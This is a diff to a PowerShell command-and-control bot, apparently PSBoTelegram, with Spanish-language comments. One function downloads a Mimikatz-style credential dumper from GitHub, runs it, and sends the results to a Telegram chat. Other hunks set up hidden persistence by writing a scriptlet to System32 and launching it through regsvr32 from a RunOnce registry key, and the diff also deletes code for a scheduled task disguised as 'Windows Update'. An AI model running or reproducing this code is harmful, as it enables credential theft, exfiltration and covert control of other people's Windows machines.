@@ -179,7 +179,7 @@ $Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privile
 
 function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
-(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
+(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 }
@@ -213,11 +213,6 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-#$accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct scrobj.dll"
-#$desencadenante = New-ScheduledTaskTrigger -AtLogOn
-#$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
-#$tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
-#if ($? -eq $false) {$texto = "No se ha podido crear la persistencia, probaremos otro metodo."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id;
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
@@ -228,10 +223,10 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 else {
 $comando = (Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"})
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";$check = Get-ItemProperty $key  | Select-String "regsvr32.exe" ; 
-if ($comando -eq $null -or $comando -eq "" -or $check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
+if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
 $modifica = "" ; set-item $Key $modifica
-Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregister-ScheduledTask -AsJob | Remove-WmiObject; Remove-Item C:\Windows\System32\update.sct; return $texto; break
+Remove-Item C:\Windows\System32\update.sct; return $texto; break
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
